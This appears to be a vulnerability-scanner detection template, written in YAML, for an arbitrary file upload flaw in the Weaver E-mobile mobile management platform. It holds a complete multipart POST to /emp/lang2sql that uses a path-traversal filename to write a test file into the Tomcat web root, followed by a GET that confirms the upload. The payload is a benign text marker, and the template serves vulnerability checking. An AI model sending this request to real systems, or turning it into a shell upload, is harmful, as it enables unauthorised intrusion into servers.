app: Weaver
query: app:"Weaver"
meta:
  name: 泛微移动管理平台E-mobile lang2sql接口存在任意文件上传
  level: 4
  tags:
  - file_upload
  description: ""
  homepage: ""
  author: X prism
  references: ""
  solution: ""
  create_at: "2024-07-13 12:44:00"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /emp/lang2sql?client_type=1&lang_tag=1
          redirect: true
          header:
          - Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK
          params: |
            ------WebKitFormBoundarymVk33liI64J7GQaK
            Content-Disposition:form-data; name="file"; filename="../../../../appsvr/tomcat/webapps/ROOT/11111.txt"
            
            2222asdasda        
            ------WebKitFormBoundarymVk33liI64J7GQaK--
        response:
        - name: code
          value: "200"
          type: equals
      - request:
          method: GET
          path: /11111.txt
          redirect: true
          header: []
          params: ""
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: 2222asdasda
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
